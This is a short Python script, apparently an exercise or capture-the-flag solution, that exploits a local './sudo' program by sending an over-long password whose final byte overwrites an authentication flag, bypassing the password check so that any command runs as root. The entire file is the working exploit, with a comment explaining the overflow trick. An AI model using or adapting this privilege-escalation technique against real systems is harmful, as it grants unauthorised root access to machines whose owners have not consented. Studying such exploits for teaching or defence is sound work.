import os, sys, subprocess


PATH_TO_SUDO = './sudo'


def run_command(cmd):
	# runs a command with root priviliges
    password = "123456789\x01"  # the last byte of the password is overwriting the auth variable, so we can write 1 into it and bypass the validation
    subprocess.call([PATH_TO_SUDO, password, cmd])


def main(argv):
    if not len(argv) == 2:
        print 'Usage: %s <command>' % argv[0]
        sys.exit(1)

    cmd = argv[1]
    run_command(cmd)


if __name__ == '__main__':
    main(sys.argv)
